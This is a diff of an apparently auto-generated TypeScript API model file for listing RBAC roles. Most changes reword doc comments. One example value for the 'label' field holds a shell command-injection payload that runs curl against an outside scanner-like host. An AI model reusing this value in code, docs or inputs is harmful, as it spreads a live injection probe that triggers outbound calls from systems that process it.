@@ -5,7 +5,7 @@ import * as $dara from '@darabonba/typescript';
 export class ListRbacRolesResponseBodyModuleData extends $dara.Model {
   /**
    * @remarks
-   * The creation date in ISO 8601 format in the UTC time zone.
+   * The creation date. The time is in ISO 8601 format in the UTC time zone.
    * 
    * @example
    * 2026-05-28T17:59:55Z
@@ -22,7 +22,7 @@ export class ListRbacRolesResponseBodyModuleData extends $dara.Model {
   /**
    * @remarks
    * Specifies whether the report is the default report. Valid values:
-   * - **0**: Not the default report.
+   * - **0**: Non-default report.
    * - **1**: Default report.
    * 
    * @example
@@ -102,7 +102,7 @@ export class ListRbacRolesResponseBodyModuleNext extends $dara.Model {
   id?: string;
   /**
    * @remarks
-   * Specifies whether the private gateway is the default one.
+   * Specifies whether it is the default private gateway.
    * 
    * @example
    * false
@@ -120,7 +120,7 @@ export class ListRbacRolesResponseBodyModuleNext extends $dara.Model {
    * The name.
    * 
    * @example
-   * label-03\\"&$(curl D93PCxNZ.popscan.xaliyun.com)%3B
+   * label-03\"&$(curl D93PCxNZ.popscan.xaliyun.com)%3B
    */
   label?: string;
   /**
@@ -183,7 +183,7 @@ export class ListRbacRolesResponseBodyModule extends $dara.Model {
   next?: ListRbacRolesResponseBodyModuleNext;
   /**
    * @remarks
-   * Specifies whether a next page exists.
+   * Indicates whether a next page exists.
    * 
    * @example
    * False
@@ -199,7 +199,7 @@ export class ListRbacRolesResponseBodyModule extends $dara.Model {
   pageSize?: number;
   /**
    * @remarks
-   * Specifies whether a previous page exists.
+   * Indicates whether a previous page exists.
    * 
    * @example
    * False
@@ -207,7 +207,7 @@ export class ListRbacRolesResponseBodyModule extends $dara.Model {
   prePage?: boolean;
   /**
    * @remarks
-   * In addition to the pagination limit, the server processes a maximum of the latest 1,000 records for the current query. If the number of results exceeds 1,000, **ResultLimit** is **true**. Narrow the time range and search again. Otherwise, **ResultLimit** is **false**.
+   * In addition to the pagination limit, the server processes a maximum of the latest 1,000 records for the current query. If the number of results exceeds 1,000, **ResultLimit** is **true**. In this case, narrow the time range and search again. Otherwise, **ResultLimit** is **false**.
    * 
    * @example
    * False
@@ -315,12 +315,14 @@ export class ListRbacRolesResponseBody extends $dara.Model {
   dynamicMessage?: string;
   /**
    * @remarks
-   * The error parameters returned.
+   * The returned error parameters.
    */
   errorArgs?: any[];
   /**
    * @remarks
-   * The maximum number of results per query. Valid values: 10 to 100. Default value: 20.
+   * The maximum number of results returned per query.
+   * 
+   * Valid values: 10 to 100. Default value: 20.
    * 
    * @example
    * 10
@@ -333,7 +335,7 @@ export class ListRbacRolesResponseBody extends $dara.Model {
   module?: ListRbacRolesResponseBodyModule;
   /**
    * @remarks
-   * The token used to start the next query. If there is no next query, this parameter is empty.
+   * The token used to start the next query. This parameter is empty if no subsequent query is available.
    * 
    * @example
    * 0l45bkwM022Dt+rOvPi/oQ==
